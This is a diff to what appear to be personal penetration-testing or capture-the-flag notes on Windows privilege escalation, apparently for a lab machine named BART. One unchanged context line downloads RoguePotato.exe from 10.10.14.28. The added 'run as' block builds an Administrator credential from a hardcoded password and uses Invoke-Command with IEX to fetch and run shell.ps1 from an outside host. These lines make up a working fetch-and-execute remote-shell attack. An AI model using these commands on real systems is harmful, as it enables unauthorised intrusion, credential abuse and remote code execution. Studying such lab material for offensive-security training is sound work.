@@ -24,5 +24,14 @@ smbserver or powershell download file
 invoke-webrequest -uri 'http://10.10.14.28/RoguePotato.exe' -outfile .\rp.exe
 ```
 
+run as
 
+```text
+$username = "BART\Administrator"
+$password = "3130438f31186fbaf962f407711faddb"
+$secstr = New-Object -TypeName System.Security.SecureString
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.64:81/shell.ps1') } -Credential $cred -Computer localhost
+```
 
